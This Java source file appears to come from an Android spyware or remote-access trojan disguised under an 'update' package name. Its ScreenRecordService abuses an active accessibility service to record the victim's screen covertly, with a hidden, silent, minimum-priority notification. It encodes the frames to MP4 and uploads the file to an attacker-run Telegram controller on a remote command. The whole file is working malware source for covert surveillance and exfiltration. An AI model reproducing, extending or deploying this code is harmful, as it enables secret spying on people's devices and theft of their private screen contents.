package com.kasari.update;

import android.app.*;
import android.content.Intent;
import android.graphics.*;
import android.media.*;
import android.os.*;
import android.view.Surface;
import androidx.core.app.NotificationCompat;
import java.io.File;
import java.nio.ByteBuffer;

/**
 * Screen recording: AccessibilityService frames → MediaCodec H.264 → MP4 → Telegram.
 * Zero extra permissions needed (AccessibilityService already active).
 */
public class ScreenRecordService extends Service {

    public static final String ACTION_RECORD  = "com.kasari.update.SCREEN_RECORD";
    public static final String EXTRA_SECONDS  = "seconds";

    private MediaCodec  mCodec;
    private MediaMuxer  mMuxer;
    private Surface     mSurface;
    private int         mVideoTrack   = -1;
    private boolean     mMuxerStarted = false;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && ACTION_RECORD.equals(intent.getAction())) {
            int secs = intent.getIntExtra(EXTRA_SECONDS, 30);
            startForeground(9904, buildNotif());
            new Thread(() -> doRecord(secs)).start();
        }
        return START_NOT_STICKY;
    }

    private Notification buildNotif() {
        return new NotificationCompat.Builder(this, BackgroundService.CH_ID)
            .setSmallIcon(android.R.drawable.sym_def_app_icon)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setSilent(true).build();
    }

    private void doRecord(int durationSec) {
        ScreenMirror sas = ScreenMirror.instance;
        if (sas == null) {
            TelegramController.sendMessage(
                "❌ Accessibility Service enable nahi.\n" +
                "Settings → Accessibility → Kasari Chauhan → ON karo");
            cleanup(); return;
        }
        TelegramController.sendMessage("🎬 Screen recording shuru... " + durationSec + "s baad MP4 aayega.");

        Bitmap first = sas.captureFrameSync(8000);
        if (first == null) {
            TelegramController.sendMessage("❌ Pehla frame nahi mila.");
            cleanup(); return;
        }

        int origW = first.getWidth(), origH = first.getHeight();
        int width  = makeEven(Math.min(720, origW));
        int height = makeEven((int)(origH * ((float) width / origW)));
        File outFile = new File(getCacheDir(), "rec_" + System.currentTimeMillis() + ".mp4");

        try {
            MediaFormat fmt = MediaFormat.createVideoFormat(MediaFormat.MIMETYPE_VIDEO_AVC, width, height);
            fmt.setInteger(MediaFormat.KEY_BIT_RATE, 800_000);
            fmt.setInteger(MediaFormat.KEY_FRAME_RATE, 2);
            fmt.setInteger(MediaFormat.KEY_I_FRAME_INTERVAL, 1);
            fmt.setInteger(MediaFormat.KEY_COLOR_FORMAT,
                MediaCodecInfo.CodecCapabilities.COLOR_FormatSurface);

            mCodec = MediaCodec.createEncoderByType(MediaFormat.MIMETYPE_VIDEO_AVC);
            mCodec.configure(fmt, null, null, MediaCodec.CONFIGURE_FLAG_ENCODE);
            mSurface = mCodec.createInputSurface();
            mCodec.start();
            mMuxer = new MediaMuxer(outFile.getAbsolutePath(), MediaMuxer.OutputFormat.MUXER_OUTPUT_MPEG_4);

            drawFrame(first, width, height); first.recycle();
            drain(false);

            int frames = 1;
            long end = System.currentTimeMillis() + durationSec * 1000L;
            while (System.currentTimeMillis() < end) {
                Thread.sleep(500);
                Bitmap frame = sas.captureFrameSync(1500);
                if (frame != null) { drawFrame(frame, width, height); frame.recycle(); frames++; }
                drain(false);
            }

            mCodec.signalEndOfInputStream();
            drain(true);
            mCodec.stop();
            if (mMuxerStarted) mMuxer.stop();
            mCodec.release(); mCodec = null;
            mMuxer.release(); mMuxer = null;
            mSurface.release(); mSurface = null;

            if (outFile.exists() && outFile.length() > 2000) {
                TelegramController.sendFile(outFile,
                    "🎬 Screen Recording (" + durationSec + "s · " + frames + " frames · 2fps)");
            } else {
                TelegramController.sendMessage("❌ Recording file empty hai.");
            }
            outFile.delete();
        } catch (Exception e) {
            TelegramController.sendMessage("❌ Recording error: " + e.getMessage());
            outFile.delete();
        } finally { cleanup(); }
    }

    private void drawFrame(Bitmap bmp, int w, int h) {
        Canvas c = mSurface.lockCanvas(null);
        if (c == null) return;
        try {
            Bitmap scaled = (bmp.getWidth()==w && bmp.getHeight()==h)
                ? bmp : Bitmap.createScaledBitmap(bmp, w, h, false);
            c.drawBitmap(scaled, 0, 0, null);
            if (scaled != bmp) scaled.recycle();
        } finally { mSurface.unlockCanvasAndPost(c); }
    }

    private void drain(boolean eos) {
        MediaCodec.BufferInfo info = new MediaCodec.BufferInfo();
        int tries = eos ? 200 : 20;
        for (int i = 0; i < tries; i++) {
            int idx = mCodec.dequeueOutputBuffer(info, 10_000);
            if (idx == MediaCodec.INFO_TRY_AGAIN_LATER) { if (!eos) break; continue; }
            if (idx == MediaCodec.INFO_OUTPUT_FORMAT_CHANGED) {
                if (!mMuxerStarted) {
                    mVideoTrack = mMuxer.addTrack(mCodec.getOutputFormat());
                    mMuxer.start(); mMuxerStarted = true;
                }
                continue;
            }
            if (idx >= 0) {
                ByteBuffer buf = mCodec.getOutputBuffer(idx);
                boolean cfg = (info.flags & MediaCodec.BUFFER_FLAG_CODEC_CONFIG) != 0;
                if (buf != null && !cfg && mMuxerStarted && info.size > 0)
                    mMuxer.writeSampleData(mVideoTrack, buf, info);
                mCodec.releaseOutputBuffer(idx, false);
                if ((info.flags & MediaCodec.BUFFER_FLAG_END_OF_STREAM) != 0) break;
            }
        }
    }

    private int makeEven(int n) { return (n % 2 == 0) ? n : n - 1; }

    private void cleanup() {
        try { if (mCodec != null) { mCodec.stop(); mCodec.release(); mCodec = null; } } catch (Exception ignored) {}
        try { if (mMuxer != null) { mMuxer.release(); mMuxer = null; } } catch (Exception ignored) {}
        try { if (mSurface != null) { mSurface.release(); mSurface = null; } } catch (Exception ignored) {}
        stopForeground(true); stopSelf();
    }

    @Override public IBinder onBind(Intent i) { return null; }
}
